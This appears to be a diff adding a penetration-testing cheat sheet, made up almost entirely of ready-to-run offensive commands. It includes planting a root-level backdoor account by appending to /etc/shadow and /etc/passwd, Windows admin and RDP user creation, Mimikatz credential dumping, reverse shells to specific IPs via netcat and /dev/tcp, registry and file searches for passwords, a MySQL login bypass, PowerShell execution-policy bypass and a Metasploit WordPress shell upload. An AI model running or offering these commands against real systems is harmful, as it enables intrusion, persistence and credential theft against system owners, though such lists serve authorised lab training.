@@ -1,0 +1,141 @@
+Linux Add User (if interactive):
+	useradd -ou 0 -g 0  sysadmin
+	usermod --shell /bin/bash sysadmin
+	passwd sysadmin
+	
+Linux Add User (no useradd/adduser)    BEST IS ABOVE
+	sysadmin/WannaCry412!
+		echo sysadmin:\$6\$dOC/aW2o\$NTeUWyTsu4HW4dfQY6NP6p5zMEsv35vm0e5p0NIw0yWc1/ox3VWO5UmgmqPYq9CfXSwnNl2EMoyL.R1kZw2L4.:17817:0:99999:7::: >> /etc/shadow
+		echo sysadmin:x:0:0::/root:/bin/bash >> /etc/passwd
+
+Windows Add User
+	net user /add <user> <password>
+		If you mess up password:  net user  <user> <password>
+	net localgroup administrators <user> /add
+	Add to RDP users:
+		net localgroup "Remote Desktop users" <user> /add
+	
+Mimikatz Credential Steal
+	privilege::debug
+	log sekurlsa.log
+	sekurlsa::logonpasswords
+	
+Windows RDP
+	Enable:        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	Disable:       reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+	Open port:  netsh advfirewall firewall add rule name="Windows Terminal" dir=in action=allow protocol=TCP localport=3389
+			 netsh advfirewall firewall add rule name="Windows Terminal" dir=out action=allow protocol=TCP localport=3389
+	Kill session: quser    -then-    logoff <session id>
+	If "Failed to connect, CredSSP required by server."
+		reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+Windows Firewall
+	[XP]             netsh firewall set portopening tcp 3389 MYSERVICE enable all
+	[7]               netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389
+	Delete rule:
+		netsh advfirewall firewall delete rule name=RDP protocol=tcp localport=3389
+
+Windows CMD Reboot
+	shutdown /r /t 0
+	
+Linux Shutdown Immediately
+	sudo shutdown -h now
+	
+Windows Kill Process
+	taskkill /IM <name.exe> /F
+	taskkill /PID <pid> /F
+
+Netcat without -e
+	mknod /tmp/backpipe p 
+	/bin/sh 0</tmp/backpipe | nc 10.11.0.193 443 1>/tmp/backpipe
+	/bin/sh 0</tmp/backpipe | nc 192.168.140.135 443 1>/tmp/backpipe
+	
+Shell Escape Sequences
+	python -c 'import pty;pty.spawn("/bin/sh")'
+	python -c 'import pty;pty.spawn("/bin/bash")'
+	perl -e 'exec "/bin/bash";'
+	awk 'BEGIN {system("/bin/bash")}'
+	[UNTESTED] find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+	
+Bash Reverse Shell
+	bash -i >& /dev/tcp/10.11.0.193/443 0>&1
+	bash -i >& /dev/tcp/192.168.140.135/443 0>&1
+	
+Bash Loop
+	seq <number of iterations> | xargs -Iz <command>
+
+Windows view SMB shares:
+	To get a list of computers:
+		net view
+	To get a list of shares from a computer:
+		net view \\<computer>
+	To access a share:
+		new view \\server-name\share-name
+
+Plunder for passwords
+	Search for passwords
+		dir /s *pass* == *cred* == *vnc* == *.config*
+		[MAY MELT SHELL] findstr /si password *.xml *.ini *.txt
+	Grep registry for keywords
+		reg query HKLM /f password /t REG_SZ /s
+		reg query HKCU /f password /t REG_SZ /s
+		
+SCP
+	scp test.txt uitsec@useag-cyber-1.na.uis.unisys.com:/home/uitsec/test.txt
+	scp <local file path> <remote user>@<remote IP>:<remote path>
+	
+SSH File Transfer
+	cat file.txt | ssh user@10.11.11.11 "cat > remote.txt"
+
+Python HTTP Server
+	python -m SimpleHTTPServer 80
+
+SMB command prompt
+	winexe -U THINC.local\\Administrator //observer cmd.exe
+	winexe -U alice //127.0.0.1 cmd.exe
+
+Raw SSL Connection to HTTPS Server
+	ncat -C --ssl -nv 192.168.45.67 443
+
+Upgrade shell to meterpreter
+	post/multi/manage/shell_to_meterpreter
+
+PowerShell OpenSSH Windows
+	https://github.com/PowerShell/Win32-OpenSSH/wiki/Install-Win32-OpenSSH
+	
+Find files owner by a specific user
+	find / -user <user> 2>/dev/null
+
+Test which programs a user can sudo
+	for i in $(cat bin.txt); do echo "<password>" | sudo -S $i --help; done  
+	sudo -l
+
+Meterpreter port forward
+	portfwd add –l <Kali port> –p <target port> –r  <target IP>
+	portfwd delete –l <Kali port> 
+	
+PowerShell exploits
+	Command line:
+		powershell.exe -exec bypass
+		Import-Module .\PowerUp.ps1
+		Invoke-AllChecks
+	Bat script:
+		@ECHO OFF
+		powershell.exe -exec bypass -command "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
+
+MySQL bypass login (if root)
+	Terminal 1:
+		sudo /etc/init.d/mysql stop
+		sudo mysqld_safe --skip-grant-tables &
+	Terminal 2:
+		mysql -u root
+
+Run command as different user:
+	su -l <user> -c /bin/bash
+		Will prompt for password
+
+WP Shell Metasploit Upload
+	exploit/unix/webapp/wp_admin_shell_upload
+
+Find command execute
+	find / -user "terry" -exec ls -la {} \; 2>/dev/null
